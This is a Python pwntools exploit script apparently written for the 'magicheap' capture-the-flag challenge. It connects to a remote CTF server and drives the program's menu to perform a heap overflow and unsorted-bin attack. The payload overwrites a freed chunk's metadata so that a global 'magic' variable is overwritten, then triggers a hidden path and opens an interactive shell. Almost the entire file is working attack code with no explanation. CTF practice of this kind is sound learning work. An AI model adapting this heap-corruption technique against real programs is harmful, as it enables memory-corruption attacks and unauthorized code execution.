# import time
from pwn import *

# from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 9999)
# io = remote("192.168.170.128", 1234)
io = remote("node4.buuoj.cn", 29292)


# io = remote("120.46.59.242",   2150)
# io = remote("43.249.195.138",  26189)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("112.6.51.212", 30791)

# io = process('./magicheap')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./ciscn_2019_es_2')
# libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')


# libc = ELF('./libc-2.23.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


def CreateHeap(size, content):
    io.recvuntil(':')
    io.sendline('1')
    io.recvuntil(':')
    io.sendline(str(size))
    io.recvuntil(':')
    io.sendline(content)


def EditHeap(idx, size, content):
    io.recvuntil(':')
    io.sendline('2')
    io.recvuntil(':')
    io.sendline(str(idx))
    io.recvuntil(':')
    io.sendline(str(size))
    io.recvuntil(':')
    io.sendline(content)


def DeleteHeap(idx):
    io.recvuntil(':')
    io.sendline('3')
    io.recvuntil(':')
    io.sendline(str(idx))


# puts_plt = elf.plt['puts']
# puts_got = elf.got['puts']
# printf_plt = elf.plt['printf']
# atoi_got = elf.got['atoi']
# main_addr = elf.symbols['main']
#
# libc = ELF('./libc.so.6')

context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

CreateHeap(0x30, 'aaaa')#0
CreateHeap(0x80, 'bbbb')#1
CreateHeap(0x10, 'cccc')#2

DeleteHeap(1)

# pause()
magic = 0x6020A0
payload_change_magic = 0x30 * b"a" + p64(0) + p64(0x91) + p64(0) + p64(magic - 0x10)
EditHeap(0, 0x50, payload_change_magic)
CreateHeap(0x80, 'dddd')
# gdb.attach(io)
# pause()

sla(b':', b'4869')

inter()
